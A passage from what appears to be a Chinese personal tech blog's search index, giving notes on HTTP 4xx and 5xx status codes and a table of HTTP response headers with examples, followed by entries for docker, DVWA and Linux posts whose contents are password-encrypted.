Required</p><p>客户端应切换到Upgrade头字段中给出的不同协议，如TLS&#x2F;1.0</p></li><li><p>428 Precondition Required </p><p>原服务器要求该请求满足一定条件。这是为了防止“未更新”问题，即客户端读取（GET）一个资源的状态，更改它，并将它写（PUT）回服务器，但这期间第三方已经在服务器上更改了该资源的状态，因此导致了冲突。”</p></li><li><p>429 Too Many Requests </p><p>用户在给定的时间内发送了太多的请求。旨在用于网络限速</p></li><li><p>431 Request Header Fields Too Large </p><p>服务器不愿处理请求，因为一个或多个头字段过大。</p></li><li><p>440 Login Time-out</p><p>客户端session超时失效，需要重新登录。</p></li><li><p>451 Unavailable For Legal Reasons</p></li></ul><h2 id="5xx-服务器错误"><a href="#5xx-服务器错误" class="headerlink" title="5xx 服务器错误"></a>5xx 服务器错误</h2><p>表示服务器无法完成明显有效的请求。这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个HEAD请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。这些状态码适用于任何响应方法。</p><ul><li><p>500 Internal Server Error</p><p>通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。假如把服务器当成超市，GET请求一个可乐，如果有返回200，没有返回404，有但是不给返回403，<strong>但是</strong>假如GET请求一个82年的可乐，超市可能一时之间理解不了，宕机了返回500，跟Ddos攻击没关系，这就是意料之外的状况。或者是来个苹果味儿的香蕉之类无法理解的请求都会导致500。软件测试人员特别喜欢看见500，因为他们测试的时候喜欢在包里面添加一些稀奇古怪的数据，把服务器弄崩，这是他的工作产出。</p></li><li><p>501 Not Implemented</p><p>服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。（例如，网络服务API的新功能）</p></li><li><p>502 Bad Gateway</p><p>作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</p></li><li><p>503 Service Unavailable</p><p>由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个Retry-After头用以标明这个延迟时间。如果没有给出这个Retry-After信息，那么客户端应当以处理500响应的方式处理它。</p></li><li><p>504 Gateway Timeout</p><p>作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。</p><p>注意：某些代理服务器在DNS查询超时时会返回400或者500错误。</p></li><li><p>505 HTTP Version Not Supported</p><p>服务器不支持，或者拒绝支持在请求中使用的HTTP版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</p></li><li><p>506 Variant Also Negotiates</p><p>由《透明内容协商协议》扩展，代表服务器存在内部配置错误，[<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#cite_note-RFC_2295-64">64]</a>被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</p></li><li><p>507 Insufficient Storage</p><p>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。</p></li><li><p>508 Loop Detected </p><p>服务器在处理请求时陷入死循环。 （可代替 208状态码]）</p></li><li><p>510 Not Extended</p><p>获取资源所需要的策略并没有被满足</p></li><li><p>511 Network Authentication Required ）</p><p>客户端需要进行身份验证才能获得网络访问权限，旨在限制用户群访问特定网络。（例如连接WiFi热点时的强制网络门户）</p></li></ul><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1**(信息类)：表示接收到请求并且继续处理</span><br><span class="line">100——客户必须继续发出请求</span><br><span class="line">101——客户要求服务器根据请求转换HTTP协议版本</span><br><span class="line">2**(响应成功)：表示动作被成功接收、理解和接受</span><br><span class="line">200——表明该请求被成功地完成，所请求的资源发送回客户端</span><br><span class="line">201——提示知道新文件的URL</span><br><span class="line">202——接受和处理、但处理未完成</span><br><span class="line">203——返回信息不确定或不完整</span><br><span class="line">204——请求收到，但返回信息为空</span><br><span class="line">205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件</span><br><span class="line">206——服务器已经完成了部分用户的GET请求</span><br><span class="line">3**(重定向类)：为了完成指定的动作，必须接受进一步处理</span><br><span class="line">300——请求的资源可在多处得到</span><br><span class="line">301——本网页被永久性转移到另一个URL</span><br><span class="line">302——请求的网页被转移到一个新的地址，但客户访问仍继续通过原始URL地址，重定向，新的URL会在response中的Location中返回，浏览器将会使用新的URL发出新的Request。</span><br><span class="line">303——建议客户访问其他URL或访问方式</span><br><span class="line">304——自从上次请求后，请求的网页未修改过，服务器返回此响应时，不会返回网页内容，代表上次的文档已经被缓存了，还可以继续使用</span><br><span class="line">305——请求的资源必须从服务器指定的地址得到</span><br><span class="line">306——前一版本HTTP中使用的代码，现行版本中不再使用</span><br><span class="line">307——申明请求的资源临时性删除</span><br><span class="line">4**(客户端错误类)：请求包含错误语法或不能正确执行</span><br><span class="line">400——客户端请求有语法错误，不能被服务器所理解。比如说访问某网站http://返回400，加上个s，https://就能访问了。</span><br><span class="line">401——请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</span><br><span class="line">HTTP 401.1 - 未授权：登录失败</span><br><span class="line">HTTP 401.2 - 未授权：服务器配置问题导致登录失败</span><br><span class="line">HTTP 401.3 - ACL 禁止访问资源</span><br><span class="line">HTTP 401.4 - 未授权：授权被筛选器拒绝</span><br><span class="line">HTTP 401.5 - 未授权：ISAPI 或 CGI 授权失败</span><br><span class="line">402——保留有效ChargeTo头响应</span><br><span class="line">403——禁止访问，服务器收到请求，但是拒绝提供服务</span><br><span class="line">HTTP 403.1 禁止访问：禁止可执行访问</span><br><span class="line">HTTP 403.2 - 禁止访问：禁止读访问</span><br><span class="line">HTTP 403.3 - 禁止访问：禁止写访问</span><br><span class="line">HTTP 403.4 - 禁止访问：要求 SSL</span><br><span class="line">HTTP 403.5 - 禁止访问：要求 SSL 128</span><br><span class="line">HTTP 403.6 - 禁止访问：IP 地址被拒绝</span><br><span class="line">HTTP 403.7 - 禁止访问：要求客户证书</span><br><span class="line">HTTP 403.8 - 禁止访问：禁止站点访问</span><br><span class="line">HTTP 403.9 - 禁止访问：连接的用户过多</span><br><span class="line">HTTP 403.10 - 禁止访问：配置无效</span><br><span class="line">HTTP 403.11 - 禁止访问：密码更改</span><br><span class="line">HTTP 403.12 - 禁止访问：映射器拒绝访问</span><br><span class="line">HTTP 403.13 - 禁止访问：客户证书已被吊销</span><br><span class="line">HTTP 403.15 - 禁止访问：客户访问许可过多</span><br><span class="line">HTTP 403.16 - 禁止访问：客户证书不可信或者无效</span><br><span class="line">HTTP 403.17 - 禁止访问：客户证书已经到期或者尚未生效</span><br><span class="line">404——一个404错误表明可连接服务器，但服务器无法取得所请求的网页，请求资源不存在。eg：输入了错误的URL</span><br><span class="line">405——用户在Request-Line字段定义的方法不允许</span><br><span class="line">406——根据用户发送的Accept拖，请求资源不可访问</span><br><span class="line">407——类似401，用户必须首先在代理服务器上得到授权</span><br><span class="line">408——客户端没有在用户指定的饿时间内完成请求</span><br><span class="line">409——对当前资源状态，请求不能完成</span><br><span class="line">410——服务器上不再有此资源且无进一步的参考地址</span><br><span class="line">411——服务器拒绝用户定义的Content-Length属性请求</span><br><span class="line">412——一个或多个请求头字段在当前请求中错误</span><br><span class="line">413——请求的资源大于服务器允许的大小</span><br><span class="line">414——请求的资源URL长于服务器允许的长度</span><br><span class="line">415——请求资源不支持请求项目格式</span><br><span class="line">416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求也不包含If-Range请求头字段</span><br><span class="line">417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求长。</span><br><span class="line">5**(服务端错误类)：服务器不能正确执行一个正确的请求</span><br><span class="line">HTTP 500 - 服务器遇到错误，无法完成请求</span><br><span class="line">HTTP 500.100 - 内部服务器错误 - ASP 错误</span><br><span class="line">HTTP 500-11 服务器关闭</span><br><span class="line">HTTP 500-12 应用程序重新启动</span><br><span class="line">HTTP 500-13 - 服务器太忙</span><br><span class="line">HTTP 500-14 - 应用程序无效</span><br><span class="line">HTTP 500-15 - 不允许请求 global.asa</span><br><span class="line">Error 501 - 未实现</span><br><span class="line">HTTP 502 - 网关错误</span><br><span class="line">HTTP 503：由于超载或停机维护，服务器目前无法使用，一段时间后可能恢复正常</span><br><span class="line">500和503在用菜刀的时候可能会出现，因为WAF拦截了</span><br></pre></td></tr></table></figure><h1 id="5-响应标记头"><a href="#5-响应标记头" class="headerlink" title="5 响应标记头"></a>5 响应标记头</h1><table><thead><tr><th align="center">字段名</th><th align="center">说明</th><th align="center">例子</th><th align="center">状态</th></tr></thead><tbody><tr><td align="center">Access-Control-Allow-Origin</td><td align="center">指定哪些网站可参与到跨来源资源共享过程中</td><td align="center"><code>Access-Control-Allow-Origin: *</code></td><td align="center">临时</td></tr><tr><td align="center">Accept-Patch</td><td align="center">指定服务器支持的文件格式类型。</td><td align="center"><code>Accept-Patch: text/example;charset=utf-8</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Ranges</td><td align="center">这个服务器支持哪些种类的部分内容范围</td><td align="center"><code>Accept-Ranges: bytes</code></td><td align="center">常设</td></tr><tr><td align="center">Age</td><td align="center">这个对象在代理缓存中存在的时间，以秒为单位</td><td align="center"><code>Age: 12</code></td><td align="center">常设</td></tr><tr><td align="center">Allow</td><td align="center">对于特定资源有效的动作。针对HTTP&#x2F;405这一错误代码而使用</td><td align="center"><code>Allow: GET, HEAD</code></td><td align="center">常设</td></tr><tr><td align="center">Cache-Control</td><td align="center">向从服务器直到客户端在内的所有缓存机制告知，它们是否可以缓存这个对象。其单位为秒</td><td align="center"><code>Cache-Control: max-age=3600</code></td><td align="center">常设</td></tr><tr><td align="center">Connection</td><td align="center">针对该连接所预期的选项</td><td align="center"><code>Connection: close</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Disposition</td><td align="center">一个可以让客户端下载文件并建议文件名的头部。文件名需要用双引号包裹。</td><td align="center"><code>Content-Disposition: attachment; filename=&quot;fname.ext&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Encoding</td><td align="center">在数据上使用的编码类型。参考 超文本传输协议压缩 。</td><td align="center"><code>Content-Encoding: gzip</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Language</td><td align="center">内容所使用的语言</td><td align="center"><code>Content-Language: da</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Length</td><td align="center">回应消息体的长度，以 字节 （8位为一字节）为单位</td><td align="center"><code>Content-Length: 348</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Location</td><td align="center">所返回的数据的一个候选位置</td><td align="center"><code>Content-Location: /index.htm</code></td><td align="center">常设</td></tr><tr><td align="center">Content-MD5</td><td align="center">回应内容的二进制 MD5 散列，以 Base64 方式编码</td><td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td><td align="center">过时的</td></tr><tr><td align="center">Content-Range</td><td align="center">这条部分消息是属于某条完整消息的哪个部分</td><td align="center"><code>Content-Range: bytes 21010-47021/47022</code></td><td align="center">常设</td></tr><tr><td align="center">Content-Type</td><td align="center">当前内容的MIME类型</td><td align="center"><code>Content-Type: text/html; charset=utf-8</code></td><td align="center">常设</td></tr><tr><td align="center">Date</td><td align="center">此条消息被发送时的日期和时间(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td><td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td><td align="center">常设</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP_ETag">ETag</a></td><td align="center">对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列</td><td align="center"><code>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">Expires</td><td align="center">指定一个日期&#x2F;时间，超过该时间则认为此回应已经过期</td><td align="center"><code>Expires: Thu, 01 Dec 1994 16:00:00 GMT</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Last-Modified</td><td align="center">所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td><td align="center"><code>Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">Link</td><td align="center">用来表达与另一个资源之间的类型关系，此处所说的类型关系是在 RFC 5988 中定义的</td><td align="center"><code>Link: &lt;/feed&gt;; rel=&quot;alternate&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">Location</td><td align="center">用来 进行重定向，或者在创建了某个新资源时使用。</td><td align="center"><code>Location: http://www.w3.org/pub/WWW/People.html</code></td><td align="center">常设</td></tr><tr><td align="center">P3P</td><td align="center">用于支持设置P3P策略，标准格式为“<code>P3P:CP=&quot;your_compact_policy&quot;</code>”。然而P3P规范并不成功，[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-33">33]</a>大部分现代浏览器没有完整实现该功能，而大量网站也将该值设为假值，从而足以用来欺骗浏览器的P3P插件功能并授权给第三方Cookies。</td><td align="center"><code>P3P: CP=&quot;This is not a P3P policy!  ``See  http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657 for more info.&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">Pragma</td><td align="center">与具体的实现相关，这些字段可能在请求&#x2F;回应链中的任何时候产生多种效果。</td><td align="center"><code>Pragma: no-cache</code></td><td align="center">常设</td></tr><tr><td align="center">Proxy-Authenticate</td><td align="center">要求在访问代理时提供身份认证信息。</td><td align="center"><code>Proxy-Authenticate: Basic</code></td><td align="center">常设</td></tr><tr><td align="center">Public-Key-Pins</td><td align="center">用于缓解中间人攻击，声明网站认证使用的传输层安全协议证书的散列值</td><td align="center"><code>Public-Key-Pins: max-age=2592000; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;;</code></td><td align="center">常设</td></tr><tr><td align="center">Refresh</td><td align="center">用于设定可定时的重定向跳转。右边例子设定了5秒后跳转至“<code>http://www.w3.org/pub/WWW/People.html</code>”。</td><td align="center"><code>Refresh: 5; url=http://www.w3.org/pub/WWW/People.html</code></td><td align="center">专利并非标准Netscape实现的扩展，但大部分网页浏览器也支持。</td></tr><tr><td align="center">Retry-After</td><td align="center">如果某个实体临时不可用，则，此协议头用来告知客户端日后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。</td><td align="center">Example 1: <code>Retry-After: 120</code>Example 2: <code>Retry-After: Fri, 07 Nov 2014 23:59:59 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">Server</td><td align="center">服务器的名字</td><td align="center"><code>Server: Apache/2.4.1 (Unix)</code></td><td align="center">常设</td></tr><tr><td align="center">Set-Cookie</td><td align="center">HTTP cookie</td><td align="center"><code>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Status</td><td align="center">通用网关接口 协议头字段，用来说明当前这个超文本传输协议回应的 状态 。普通的超文本传输协议回应，会使用单独的“状态行”（”Status-Line”）作为替代，这一点是在 RFC 7230 中定义的。</td><td align="center"><code>Status: 200 OK</code></td><td align="center">Not listed as a registered field name</td></tr><tr><td align="center">Strict-Transport-Security</td><td align="center">HTTP 严格传输安全这一头部告知客户端缓存这一强制 HTTPS 策略的时间，以及这一策略是否适用于其子域名。</td><td align="center"><code>Strict-Transport-Security: max-age=16070400; includeSubDomains</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Trailer</td><td align="center">这个头部数值指示了在这一系列头部信息由由分块传输编码编码。</td><td align="center"><code>Trailer: Max-Forwards</code></td><td align="center">常设</td></tr><tr><td align="center">Transfer-Encoding</td><td align="center">用来将实体安全地传输给用户的编码形式。当前定义的方法包括：分块（chunked）、compress、deflate、gzip和identity。</td><td align="center"><code>Transfer-Encoding: chunked</code></td><td align="center">常设</td></tr><tr><td align="center">Upgrade</td><td align="center">要求客户端升级到另一个协议。</td><td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td><td align="center">常设</td></tr><tr><td align="center">Vary</td><td align="center">告知下游的代理服务器，应当如何对未来的请求协议头进行匹配，以决定是否可使用已缓存的回应内容而不是重新从原始服务器请求新的内容。</td><td align="center"><code>Vary: *</code></td><td align="center">常设</td></tr><tr><td align="center">Via</td><td align="center">告知代理服务器的客户端，当前回应是通过什么途径发送的。</td><td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td><td align="center">常设</td></tr><tr><td align="center">Warning</td><td align="center">一般性的警告，告知在实体内容体中可能存在错误。</td><td align="center"><code>Warning: 199 Miscellaneous warning</code></td><td align="center">常设</td></tr><tr><td align="center">WWW-Authenticate</td><td align="center">表明在请求获取这个实体时应当使用的认证模式。</td><td align="center"><code>WWW-Authenticate: Basic</code></td><td align="center">常设</td></tr><tr><td align="center">X-Frame-Options</td><td align="center">点击劫持保护：<code>deny</code>：该页面不允许在 frame 中展示，即使是同域名内。<code>sameorigin</code>：该页面允许同域名内在 frame 中展示。<code>allow-from *uri*</code>：该页面允许在指定uri的 frame 中展示。<code>allowall</code>：允许任意位置的frame显示，非标准值。</td><td align="center"><code>X-Frame-Options:</code></td><td align="center"></td></tr></tbody></table><h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Bdpagetype</span><span class="punctuation">: </span>2</span><br><span class="line"><span class="attribute">Bdqid</span><span class="punctuation">: </span>0x836a8eec00047b12</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>private</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html;charset=utf-8</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 19 Sep 2022 08:52:29 GMT</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>Mon, 19 Sep 2022 08:52:29 GMT</span><br><span class="line"><span class="attribute">Isprivate</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>BWS/1.1</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>BDSVRTM=273; path=/</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>BD_HOME=1; path=/</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>H_PS_PSSID=37155_36545_37353_37300_36885_37274_37261_26350_37343_37371; path=/; domain=.baidu.com</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span><span class="punctuation">: </span>max-age=172800</span><br><span class="line"><span class="attribute">Traceid</span><span class="punctuation">: </span>166357754902251922029469538310763608850</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>sameorigin</span><br><span class="line"><span class="attribute">X-Ua-Compatible</span><span class="punctuation">: </span>IE=Edge,chrome=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>355396</span><br></pre></td></tr></table></figure><p>Server：网站所使用的容器，Apache等。</p><p>Date：表示消息发送的时间，时间的描述格式由rfc822定义。Date描 述的时间表示世界标准时，换算成本地时间，需要知道用户所在的时区。你可以用setDateHeader来设置这个头以避免 转换时间格式的麻烦。</p><p>Expires：指明应该在什么时候认为文档已经过期，从而不再缓存它，重新从服务器获取，会更新缓存。过期之前使用本 地缓存。HTTP1.1的客户端和缓存会将非法的日期格式（包括0）看作已经过期。eg：为了让浏览器不要缓存页面，我 们也可以将Expires实体报头域，设置为0。</p><p>X-AspNet-Version：如果网站是用ASP.NET开发的，这个header用来表示ASP.NET的版本。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2024/05/25/docker/"/>
      <url>/2024/05/25/docker/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="843507aa54954401dbcceb551ccc9e748b1953d331817508cf96ff7ab7764f64">893c47b461890a24b451429400ee3330437d76ab6e3a22b8942c51d9b37c86b8775e28d5d64c9bdd66bb3b1b371ca8059611cdfaf98b64c13fe90b843681f040715ec1ac964712fc53564998442fe9da00577e965c288cdece4f15a7fe81bfa942be3e6e76e804397c677a469288910c7aa88f843dfb4efa2aabc6650c99125a3235dc97067217c61f3eb7f5dbbfd4347a05a2c8ceb9a3dea5474d7a6501e19e195f53df1616fb42b5864702052c67fbbf197e6b725d419da373e7236239da905702085ab5d67d084c3ea0722ef583a645076005d0a43abcf61866df7cca2a33b5e0a8b0ed7b275d76b7be017f5f8e22128d7fa7f996884a54a5ccae1b657e8d85672f7352ba1c6db5b5dde9cf94d8c99361d21c33f65f20680f01c21628d6cb05d4ec8556308ca332bd5bbfda41f83b2d0cc3a9a0a5f68cdf94d53b8627902b2196fcc7845a13f4102987a5c755c986011c8cb969aadb33199f83fde189b19c79c6d3f1502854b740141db3e1483e2721218cb995dfe494fe9cf8cceb939785d50dcfc418280bdc2a2bbfc058d00245b2a9b369a552a55431c40d8bac774d76c53990dce4da45349316e6e0a33c24cf8e9e4deab0ec8f8afc3b0554d24f02bfae78c4383be2d7c70eb492e8ca42ce58e82cbaf186bc37be1aa94434bd504836cbf2971412456a531ead2a71969683eb3fc8281b944a025fbf4b2a97f3505bc88780757e3cc7a1f1ee91f0607f572905d2ab627624f5f5b9d44cc1745e8fd2ce216d420204e4af67f1e14b4652161f0870213b680f72495b09045c23af5754148575672a15b86bdf0b46fecef42737fff072b35be6e697f57f70f277533b7a00ae13e24c5c0494765bf4b13252fa52599d7195e17e0fc5c084372cbbc407f31285e1d3d18bd7ca1978ed643ad147eab8c03df07409d6f97e511060e53854c512e6fed01ba7255b6855a8fad1a1d309719bb51df9e97cbd5c295e20d2025927fe9b9920094236cf7979d7f7cf1de1ad0d905fcd948be1023f477ccfe4e3f676e40140091da2cd10b901105f808018916cead9a47d2c5bb126e9fb39ea0e9205394b1ae331157aea3fa199fe7d346468bcebf7cae83026df57d685d61bc27e9c39c747b1986105fead9373e7949b9998d53c72bc43de187b37ed66a796d92151307eb17eeb85fe106773113d866cb0a9ff36f067112a573f5e03258b1797d9fa13867efce8919c9b2e2d4b11464051bc55331687d87fe548e32545fe44e140528fd1486128adc211a60ac35ba8795a327ab0e4f8c9a4de80a6df589bf537d334340703f35e232c6b1a6cbb73d256630059722c599378ec43a77d7fe77b28dcd9dd5313cae0576a96adf76b89b9ce806a0744fc2e25ae95e68ab638fe2de1d71365a6d7fec62a8df1b960a9d982661d0ad6a8ab4dd2a57d78bef1ed624080e3e424f522d0eaae29a1f82c10ba4a7cc656c43839a80aa781fc01595c1e27c2bcac877b32769bc1791eb18c91001f70c5984fcfb849c9fb1427b495289a2e735ce590b30b84e9e32f984b6618618f488ddaeb647e3adb67223708f9d7ea7d95979cce1b86238660a9c5304f582ab0703cf092c9e2e7d8a3fb5969e17134175e43139bb4c9942432e0b3ad4b21b652b6669e1b219dd8f83283ddd93693be26a8888bb3a89b1f7690a8db9a783b46917d29f590b6d443f9d3caf63687203e9dc902614488878c6efb232f0944647d1eef34c6ea966244d6f5f1b0100d234681399c4ab3d809f51ab148bba0b12696fddcea7fd1a5bd2766b41539527f9cf4d330564e8f5f38b3f8fc7e8941e4c3ac5e1a2dda7ba4e93dc7c815dfa27719d6fa198de576cee3c0add13508e8dbfca3f1f20e6c00d00c0efe3843f4478b118e42e681207b23e358bf5cd3105c6c948223aa8569522b6ee38dfb8c9bef6a9b54f3825002201806f4866a6fa8da6b8fd06ea916f7ccab450695e077505e10ee4be0917c200e041f82ea344b15d7b1183159682593c204906d5ad3fd8841d3a0afbd205fa17b9941d6acfe615b9c406a8e89468e6a1f0ff17008ecb07c442afe2e912ab5353a806a4ab9bb9aaccbfe75bd22dd332db28bb5b3d8f864b843dd0a2cb1276e43f949bfaf913c51d738e14d8591f8d75a9d94ffc1c2bc1a6600d0967068d26dc84f2d605537d2e77dd0ddcde629ec794e9bea57374794eed187f3ff2ee563896257d643dcf6026ea092135ebc86ae854a5dae6bc46bac917a84eeb1a04ff351c03ac15e52278cd169d13811bb98e2ef18cbd8fe02209b8863aef474197ba21afec533a4f253e04704a561a25912530710146d07c01c3597eb9988ff284383b112f696213fb90f1a3cc5b0d2b3ea7a0f69987c66700f1b66433b960ac971e0ad1f71f9c0533fdb9898be98703ea2cd7c9116faba7a5181cabe77635d08cbce5b2df957fe93f7445a63a40c89848682c4bbd16543092879979063cdd4464d26fb2c3b0128777fa4e1c0397ad4ba69ee5ac3ae3e4d31e01eaa10cb4080adfe3eaa6e124715d95b87b21c91d9b728b8bee052fe76f2e37e37b0b6692e1e9841ca311ab910c3f3a37434e2fbc3bd73d76db60b4627f5afb8c57fd0d8eefb6ef85c12dff0c546ce4f3db746cf0d69546c90d9951ec53f82621076b78ddb1a12848504d0df1b10285e40551244e075dcd8389db94b0b495a1850891ded80237deefd58bdd2108cc018c6a13d4f26755014030ad33cc74706af4e20ce09a9dec13cead267220ede60852e63bd45f616baa8aca90efcedaa8efe5e4eb85cbf18bfd2c11c7edcefd0e0c7cbbb2ad8d84eb835bcdbff8d5dbf2e0c35a0eceebfa95c2909b8328ffb6e9a8e4ac9a9b623a4bea8e7ee02ad246adb520eb8ebdd59b4979ac7da8aa875b7fe857a30a4143499f57fc40cae7fc4571feb5fc2901750c8342baf9491f48e246fef0d6f31591cc4d77c5ab6256193ed3fb9227da475a4dd0008d2610430de9b3362b32cfc3f2b29e0457263d7a7c526dec5f519bd1201ee65f7cc04c78b97889a0419b395b59273ed65d923a2077d07e86f3ef8052e83f9944d5c6926ef1c318e3643610708a8452222c56ec744d57d5f05bed49d00b75dbf50aeb5192dac99938602bc74c755ba584942bb2f8d5cd09f301ed4b54e0f385c45f27b9eca52ffb4502f345c0ff7525a5db131d139eae3d20232239560980ceabaf46e69a68adf82fc9db0f3a915c1d3df536a4ed5d753fb61222233f84160fcd6713c41ad2c4fc2db795e759efdb6e3f47a663329441efae4b263858641a3bdae79d49b26cf142b15df2ce9cc98ab13991723cb31a40c4b83093fe1f86d931879331c88987222f69ab90c57ff3a35f0591130156fa4979ee2ea24602d2b54cfbcc3ecc143dfd918cbc1ff66519fa4803661d60effbea67994dbf3eef6e3a8e87eff099f3873026997b13682ad4167aa5a54bf5ab2dcf58fbd600d59cdc610991d243750d25daec9832af9f51ad64c46d318f1d0200eb9fcbf10fdcc47e26e4be77556d16799351cf3ccd1db9ee3a271a0b0d909418dfd6243a2f85bc7258bfe01ae8cb41cab0d64d4ddfbb91c5c9144d24997b9bf6677b40840cfa67784044d0ec8e416123cf77f7145d5471a205a63445fe38990</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa</title>
      <link href="/2024/05/25/dvwa/"/>
      <url>/2024/05/25/dvwa/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bdf96ed05643ff19ef896b8c2ca7de6e23f9bb8ce57c83731d334e7b38b948b2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux杂记</title>
      <link href="/2024/05/25/linux%E6%9D%82%E8%AE%B0/"/>
      <url>/2024/05/25/linux%E6%9D%82%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0b94a365a7d67c9e88d2ea868c901f5176212f5108e5778feeaeee623f5307a1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
